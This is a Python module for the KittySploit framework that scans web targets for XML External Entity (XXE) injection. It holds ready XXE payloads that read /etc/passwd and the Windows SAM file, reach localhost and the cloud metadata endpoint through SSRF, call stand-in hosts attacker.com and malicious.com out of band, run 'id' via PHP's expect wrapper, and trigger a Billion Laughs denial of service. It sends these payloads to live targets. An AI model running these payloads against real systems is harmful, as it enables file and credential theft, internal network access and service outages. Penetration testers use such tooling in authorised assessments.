#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import base64


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'XXE Scanner',
        'description': 'Scans for XML External Entity (XXE) injection vulnerabilities including file disclosure, SSRF, and denial of service',
        'author': 'KittySploit Team',
        'tags': ['web', 'xxe', 'xml', 'scanner', 'security', 'injection'],
        'references': [
            'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
            'https://portswigger.net/web-security/xxe',
            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
        ]
    }

    # XXE payloads
    XXE_PAYLOADS = [
        # Basic XXE - File disclosure
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
        
        # XXE - Windows file disclosure
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/config/sam">]>
<foo>&xxe;</foo>''',
        
        # XXE - SSRF
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
<foo>&xxe;</foo>''',
        
        # XXE - Cloud metadata
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>''',
        
        # XXE - Parameter entity
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>''',
        
        # XXE - Blind XXE (out-of-band)
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>''',
        
        # XXE - PHP expect wrapper
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>''',
        
        # XXE - Denial of Service (Billion Laughs)
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>''',
        
        # XXE - Base64 encoded
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///etc/passwd">]>
<foo>&xxe;</foo>''',
    ]

    # Parameter names commonly used for XML
    XML_PARAMS = [
        'xml', 'data', 'input', 'content', 'body',
        'request', 'payload', 'message', 'xml_data',
        'xml_data', 'xml_content', 'xml_body',
    ]

    def check(self):
        """
        Check if the target is accessible and might accept XML
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    def test_xxe_payload(self, payload, param_name='xml', method='POST'):
        """
        Test an XXE payload
        
        Args:
            payload: The XXE payload to test
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False,
                    timeout=10
                )
            else:
                # POST with XML content
                headers = {
                    'Content-Type': 'application/xml',
                    'Content-Type': 'text/xml',
                }
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=payload,
                    headers=headers,
                    allow_redirects=False,
                    timeout=10
                )

            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}

            # Analyze response for XXE indicators
            is_vulnerable = False
            indicators = []
            xxe_type = None

            response_text = response.text.lower()
            
            # Check for file disclosure (/etc/passwd)
            if 'file:///etc/passwd' in payload.lower() or 'file:///c:/windows' in payload.lower():
                if 'root:' in response_text and 'bin/bash' in response_text:
                    is_vulnerable = True
                    xxe_type = 'File Disclosure'
                    indicators.append('/etc/passwd content detected')
                elif 'sam' in response_text or 'windows' in response_text:
                    is_vulnerable = True
                    xxe_type = 'File Disclosure'
                    indicators.append('Windows file content detected')
            
            # Check for SSRF indicators
            if 'http://127.0.0.1' in payload.lower() or 'http://169.254.169.254' in payload.lower():
                if 'connection refused' in response_text or 'connection timeout' in response_text:
                    is_vulnerable = True
                    xxe_type = 'SSRF'
                    indicators.append('Network error (possible SSRF)')
                elif '127.0.0.1' in response_text or 'localhost' in response_text:
                    is_vulnerable = True
                    xxe_type = 'SSRF'
                    indicators.append('Internal IP detected in response')
            
            # Check for XML parsing errors
            xml_errors = [
                'xml parsing error', 'xml parse error',
                'xml syntax error', 'xml parser error',
                'entity reference', 'external entity',
                'doctype', 'xml declaration',
            ]
            
            for error in xml_errors:
                if error in response_text:
                    is_vulnerable = True
                    if not xxe_type:
                        xxe_type = 'XML Parsing Error'
                    indicators.append(f'XML error: {error}')
                    break
            
            # Check for denial of service indicators
            if 'billion laughs' in payload.lower() or 'lol9' in payload.lower():
                if response.status_code in [500, 502, 503, 504] or len(response.text) == 0:
                    is_vulnerable = True
                    xxe_type = 'Denial of Service'
                    indicators.append('Possible DoS (Billion Laughs attack)')
            
            # Check for out-of-band indicators
            if 'attacker.com' in payload.lower() or 'malicious.com' in payload.lower():
                # This would require external monitoring, simplified here
                indicators.append('Out-of-band XXE payload (requires external monitoring)')

            return {
                'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'xxe_type': xxe_type,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }

        except Exception as e:
            return {
                'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the XXE scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting XXE scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test POST parameters (most common for XML)
        print_status("Testing POST parameters for XXE vulnerabilities...")
        print_info("")
        
        for param in self.XML_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.XXE_PAYLOADS[:8], 1):  # Test first 8 payloads per param
                result = self.test_xxe_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XXE found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {result.get('payload', '')[:60]}...")
                    print_info(f"      Type: {result.get('xxe_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info(f"      Status Code: {result.get('status_code')}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test GET parameters (less common but possible)
        print_status("Testing GET parameters for XXE vulnerabilities...")
        print_info("")
        
        for param in self.XML_PARAMS[:3]:  # Test first 3 params via GET
            print_info(f"Testing GET parameter: {param}")
            
            for payload in self.XXE_PAYLOADS[:3]:  # Test first 3 payloads
                result = self.test_xxe_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XXE found (GET)!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Type: {result.get('xxe_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("XXE Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("XXE vulnerabilities detected:")
            print_info("")
            
            # Group by XXE type
            by_type = {}
            for vuln in self.vulnerabilities:
                xxe_type = vuln.get('xxe_type', 'Unknown')
                if xxe_type not in by_type:
                    by_type[xxe_type] = []
                by_type[xxe_type].append(vuln)
            
            for xxe_type, vulns in by_type.items():
                print_info(f"{xxe_type} ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:5]:  # Show first 5 per type
                    payload_short = vuln.get('payload', '')[:40] + '...' if len(vuln.get('payload', '')) > 40 else vuln.get('payload', '')
                    indicators = ', '.join(vuln.get('indicators', [])[:1])
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'POST'),
                        payload_short,
                        indicators
                    ])
                
                if table_data:
                    print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
                print_info("")
            
            print_warning("IMPORTANT: These are potential XXE vulnerabilities. Manual verification is required.")
            print_info("Note: Out-of-band XXE requires external monitoring to detect.")
        else:
            print_info("No XXE vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
            print_info("Note: Out-of-band XXE attacks require external monitoring to detect.")
        
        return True
